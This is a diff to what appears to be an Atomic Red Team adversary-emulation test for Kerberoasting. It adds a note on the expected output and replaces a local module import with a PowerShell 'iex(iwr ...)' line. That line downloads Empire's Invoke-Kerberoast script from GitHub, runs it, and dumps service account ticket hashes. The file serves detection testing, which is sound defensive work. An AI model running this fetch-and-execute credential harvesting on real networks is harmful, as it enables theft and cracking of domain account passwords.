@@ -10,6 +10,7 @@ atomic_tests:
     The following are further sources and credits for this attack:
     [Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
     [Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
+    when executed successfully , the test displays available services with their NTLM hashes. If the testing host is not joined to a domain, there is no output 
   
   supported_platforms:
     - windows
@@ -18,5 +19,5 @@ atomic_tests:
     name: powershell
     elevation_required: false  
     command: | 
-      Import-Module .\Invoke-Kerberoast.ps1
+      iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
       Invoke-Kerberoast | fl
